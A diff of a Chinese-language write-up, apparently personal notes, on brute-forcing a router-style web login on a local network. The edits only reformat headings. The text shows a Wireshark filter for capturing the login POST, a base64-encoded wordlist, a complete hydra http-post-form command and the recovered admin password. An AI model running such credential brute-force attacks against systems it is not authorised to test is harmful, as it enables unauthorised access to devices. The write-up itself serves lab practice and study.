@@ -44,7 +44,7 @@ Nmap done: 1 IP address (1 host up) scanned in 159.83 seconds
 填入随机密码123456后跳转到http://192.168.0.252/login.asp#pwdError
 看来还需要看下提交的表单参数
 
-#抓包
+# 抓包
 
 模拟登陆，给wireshark过滤规则：http.request.method==POST
 
@@ -80,14 +80,13 @@ HTML Form URL Encoded: application/x-www-form-urlencoded
         Value: MTIzNDU2
 ```
 
-#构造URL
+# 构造URL
 
 根据抓包的FULL-URL构造如下：
 http://192.168.0.252/login/Auth:username=admin&password=`[password]`
 且判断返回的错误关键字是`pwdError`
 
-#
-选择密码字典
+# 选择密码字典
 
 ```bash
 root@kali:/tmp# cp /usr/share/wordlists/fern-wifi/common.txt  ./password.txt
@@ -108,7 +107,7 @@ root@kali:/tmp# sh tans.sh
 
 ```
 
-#执行attack
+# 执行attack
 ```bash
 root@kali:/tmp# hydra -L /tmp/user.txt -P /tmp/password-base64.txt  -vV -f 192.168.0.252 http-post-form "/login/Auth:username=^USER^&password=^PASS^:pwdError"
 Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
@@ -160,4 +159,4 @@ root@kali:/tmp# echo "QWRtaW4yMDE4"|base64 -d
 Admin2018
 
 ```
-#舒服了
+# 舒服了
